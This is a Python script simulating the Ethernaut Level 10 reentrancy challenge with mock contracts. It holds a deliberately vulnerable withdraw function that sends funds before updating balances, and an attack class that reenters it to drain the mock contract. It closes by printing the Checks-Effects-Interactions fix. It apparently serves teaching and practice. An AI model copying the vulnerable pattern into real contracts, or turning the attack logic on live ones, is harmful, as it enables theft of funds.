#!/usr/bin/env python3
"""
Ethernaut Level 10: Reentrancy - Exploit Validator
Validates reentrancy attack without on-chain execution
This is THE CLASSIC smart contract vulnerability (TheDAO hack)
"""

class MockReentrance:
    """Vulnerable contract with reentrancy bug"""
    
    def __init__(self):
        self.balances = {}
        self.total_balance = 10  # Contract starts with 10 ETH
    
    def donate(self, to, value):
        """Donate ETH to someone"""
        if to not in self.balances:
            self.balances[to] = 0
        self.balances[to] += value
        return True
    
    def balance_of(self, who):
        return self.balances.get(who, 0)
    
    def withdraw(self, amount, caller):
        """VULNERABLE: external call BEFORE state update"""
        if self.balances.get(caller, 0) >= amount:
            # VULNERABILITY: Send ETH BEFORE updating balance
            # This allows reentrant calls to see old balance
            
            # Simulate external call to caller
            if isinstance(caller, MockAttackContract):
                # During this call, attacker can call withdraw again
                caller.receive_eth(amount, self)
            
            # State update happens AFTER external call
            self.balances[caller] -= amount
            self.total_balance -= amount
            return True
        return False
    
    def get_total_balance(self):
        return self.total_balance

class MockAttackContract:
    """Malicious contract that exploits reentrancy"""
    
    def __init__(self, target):
        self.target = target
        self.stolen = 0
        self.reentrancy_count = 0
        self.max_reentrancy = 10  # Prevent infinite loop in simulation
    
    def attack(self, initial_deposit):
        """Execute reentrancy attack"""
        # Step 1: Donate to ourselves
        self.target.donate(self, initial_deposit)
        
        # Step 2: Withdraw (triggers reentrancy)
        self.target.withdraw(initial_deposit, self)
    
    def receive_eth(self, amount, target):
        """Called by target when sending ETH - we reenter here!"""
        self.stolen += amount
        self.reentrancy_count += 1
        
        # Check if we can reenter (balance not yet updated!)
        current_balance = target.balance_of(self)
        target_balance = target.get_total_balance()
        
        # Keep withdrawing while possible
        if self.reentrancy_count < self.max_reentrancy and target_balance > 0:
            if current_balance > 0:
                # Reenter! The balance hasn't been updated yet
                target.withdraw(min(amount, target_balance), self)

def run_exploit():
    """Execute the reentrancy exploit and validate"""
    print("=" * 60)
    print("Ethernaut Level 10: Reentrancy - Exploit Simulation")
    print("=" * 60)
    
    # Setup
    target = MockReentrance()
    attacker = MockAttackContract(target)
    
    print("\n[SETUP] Reentrance contract deployed")
    print(f"  Contract balance: {target.get_total_balance()} ETH")
    print(f"  Attacker initial deposit: 1 ETH")
    
    # Pre-check
    initial_contract_balance = target.get_total_balance()
    assert initial_contract_balance == 10, "Contract should start with 10 ETH"
    print("  âœ“ Target has funds to steal")
    
    # Execute attack
    print("\n[ATTACK] Executing reentrancy exploit...")
    print("  1. Donate 1 ETH to attacker address")
    print("  2. Call withdraw(1 ETH)")
    print("  3. In receive_eth(), call withdraw again")
    print("  4. Repeat until contract is empty")
    
    attacker.attack(1)
    
    print(f"\n  Reentrancy depth: {attacker.reentrancy_count} calls")
    print(f"  Total stolen: {attacker.stolen} ETH")
    print("  âœ“ Attack executed")
    
    # Verify results
    print("\n[VERIFICATION] Checking exploit results...")
    
    final_contract_balance = target.get_total_balance()
    print(f"  Contract balance after: {final_contract_balance} ETH")
    print(f"  Attacker stolen amount: {attacker.stolen} ETH")
    
    assert attacker.stolen > 1, "Should steal more than initial deposit"
    assert final_contract_balance < initial_contract_balance, "Contract should lose ETH"
    print("  âœ“ PASS - Reentrancy successful!")
    
    print("\n" + "=" * 60)
    print("ðŸŽ‰ EXPLOIT VALIDATION SUCCESSFUL!")
    print("")
    print("Key Insight:")
    print("  External call BEFORE state update = REENTRANCY")
    print("  Attacker reenters while their balance is still 'valid'")
    print("")
    print("The Fix: Checks-Effects-Interactions pattern")
    print("  1. Check balance >= amount")
    print("  2. Update balance (EFFECT)")
    print("  3. Send ETH (INTERACTION - last!)")
    print("=" * 60)
    
    return True

if __name__ == "__main__":
    success = run_exploit()
    exit(0 if success else 1)
